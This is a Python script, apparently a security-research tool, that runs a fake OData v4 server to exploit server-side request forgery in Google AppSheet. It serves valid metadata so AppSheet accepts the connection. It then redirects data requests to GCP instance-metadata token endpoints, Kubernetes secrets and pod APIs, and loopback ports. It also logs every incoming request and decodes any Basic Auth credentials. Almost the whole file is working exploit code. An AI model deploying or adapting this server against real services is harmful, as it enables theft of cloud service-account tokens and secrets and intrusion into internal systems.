#!/usr/bin/env python3
"""
AppSheet OData SSRF Test Server
- Serves valid OData v4 metadata so AppSheet considers the connection successful
- Logs ALL incoming requests with full headers (Authorization decoded, GCP IPs flagged)
- Redirects data requests to configurable internal targets
- Usage: python3 odata-ssrf-server.py [--port 7332] [--target imds] [--log hits.jsonl]
"""

import sys
import json
import base64
import argparse
import socket
from datetime import datetime, timezone
from http.server import HTTPServer, BaseHTTPRequestHandler

# ── OData metadata ──────────────────────────────────────────────────────────
# Returns this for /$metadata — AppSheet accepts the connection and shows entity sets
ODATA_META = b'''<?xml version="1.0" encoding="utf-8"?>
<edmx:Edmx Version="4.0" xmlns:edmx="http://docs.oasis-open.org/odata/ns/edmx">
  <edmx:DataServices>
    <Schema Namespace="SSRFService" xmlns="http://docs.oasis-open.org/odata/ns/edm">
      <EntityType Name="Row">
        <Key><PropertyRef Name="Id"/></Key>
        <Property Name="Id"    Type="Edm.Int32"  Nullable="false"/>
        <Property Name="Name"  Type="Edm.String"/>
        <Property Name="Value" Type="Edm.String"/>
      </EntityType>
      <EntityContainer Name="DefaultContainer">
        <EntitySet Name="Rows" EntityType="SSRFService.Row"/>
      </EntityContainer>
    </Schema>
  </edmx:DataServices>
</edmx:Edmx>'''

# ── Redirect targets ─────────────────────────────────────────────────────────
TARGETS = {
    # GCP IMDS — requires Metadata-Flavor: Google header (we prove TCP reach)
    'imds_token':    'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token',
    'imds_sa':       'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/',
    'imds_hostname': 'http://169.254.169.254/computeMetadata/v1/instance/hostname',
    'imds_all':      'http://169.254.169.254/computeMetadata/v1/?recursive=true',
    'imds_root':     'http://169.254.169.254/',
    # GCP internal hostname (resolves to 169.254.169.254 inside GCP)
    'meta_internal': 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
    # Kubernetes API (GKE — has HTTPS with cluster CA cert)
    'k8s_secrets':   'https://kubernetes.default.svc/api/v1/secrets',
    'k8s_pods':      'https://kubernetes.default.svc/api/v1/namespaces/default/pods',
    # Loopback — probe internal services on AppSheet's backend container
    'localhost_80':  'http://127.0.0.1/',
    'localhost_8080':'http://127.0.0.1:8080/',
    'localhost_3000':'http://127.0.0.1:3000/',
    'localhost_9000':'http://127.0.0.1:9000/',
}

# GCP IP prefixes (for flagging server-side hits vs tunnel/browser hits)
GCP_PREFIXES = ('35.', '34.', '130.211.', '104.154.', '104.196.',
                '146.148.', '23.236.', '23.251.', '107.167.', '107.178.')


class SSRFHandler(BaseHTTPRequestHandler):
    redirect_target = TARGETS['imds_token']
    log_file = None

    def _is_gcp(self, ip):
        return any(ip.startswith(p) for p in GCP_PREFIXES)

    def _log(self, body=b''):
        ts   = datetime.now(timezone.utc).isoformat()
        ip   = self.client_address[0]
        gcp  = self._is_gcp(ip)
        hdrs = dict(self.headers)

        # Decode Basic Auth
        auth_raw = hdrs.get('Authorization', '')
        auth_dec = None
        if auth_raw.lower().startswith('basic '):
            try:
                auth_dec = base64.b64decode(auth_raw[6:]).decode()
            except Exception:
                pass

        # Terminal output
        gcp_tag = '  *** GCP BACKEND HIT ***' if gcp else ''
        print(f'\n[{ts}] {self.command} {self.path} from {ip}{gcp_tag}', flush=True)
        for k, v in hdrs.items():
            print(f'  {k}: {v}', flush=True)
        if auth_dec:
            print(f'  Authorization DECODED → {auth_dec}', flush=True)
        if body:
            print(f'  Body → {body[:400]}', flush=True)

        # JSON log
        if self.log_file:
            entry = {
                't': ts, 'ip': ip, 'gcp': gcp,
                'method': self.command, 'path': self.path,
                'headers': hdrs, 'auth_decoded': auth_dec,
                'body': body.decode(errors='replace') if body else None,
            }
            try:
                with open(self.log_file, 'a') as f:
                    f.write(json.dumps(entry) + '\n')
            except Exception as e:
                print(f'  [!] Log write failed: {e}', flush=True)

        return gcp

    def _serve_metadata(self):
        self.send_response(200)
        self.send_header('Content-Type', 'application/xml; charset=utf-8')
        self.send_header('OData-Version', '4.0')
        self.end_headers()
        self.wfile.write(ODATA_META)
        print(f'  → 200 OData metadata served', flush=True)

    def _redirect(self):
        self.send_response(302)
        self.send_header('Location', self.redirect_target)
        self.end_headers()
        print(f'  → 302 to {self.redirect_target}', flush=True)

    def do_GET(self):
        self._log()
        if '$metadata' in self.path or self.path in ('/', ''):
            self._serve_metadata()
        else:
            self._redirect()

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body   = self.rfile.read(length) if length else b''
        self._log(body)
        self._redirect()

    def log_message(self, *args):
        pass


def port_free(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        return s.connect_ex(('127.0.0.1', port)) != 0


def main():
    ap = argparse.ArgumentParser(description='AppSheet OData SSRF test server')
    ap.add_argument('--port',          type=int, default=7332)
    ap.add_argument('--host',          default='0.0.0.0')
    ap.add_argument('--target',        default='imds_token', choices=list(TARGETS.keys()))
    ap.add_argument('--custom-target', help='Override redirect URL directly')
    ap.add_argument('--log',           help='Write JSON hit log to this file')
    args = ap.parse_args()

    target = args.custom_target or TARGETS[args.target]
    SSRFHandler.redirect_target = target
    SSRFHandler.log_file        = args.log

    if not port_free(args.port):
        print(f'[!] Port {args.port} in use. Run: fuser -k {args.port}/tcp', file=sys.stderr)
        sys.exit(1)

    print('[*] AppSheet OData SSRF Server', flush=True)
    print(f'[*] Listening   : {args.host}:{args.port}', flush=True)
    print(f'[*] /$metadata  : returns valid OData v4 XML (AppSheet connects successfully)', flush=True)
    print(f'[*] /other paths: 302 → {target}', flush=True)
    print(f'[*] Log file    : {args.log or "disabled"}', flush=True)
    print('[*] Available --target values:', flush=True)
    for k, v in TARGETS.items():
        mark = ' ← active' if v == target else ''
        print(f'      {k:<16} {v}{mark}', flush=True)
    print('', flush=True)

    HTTPServer((args.host, args.port), SSRFHandler).serve_forever()


if __name__ == '__main__':
    main()
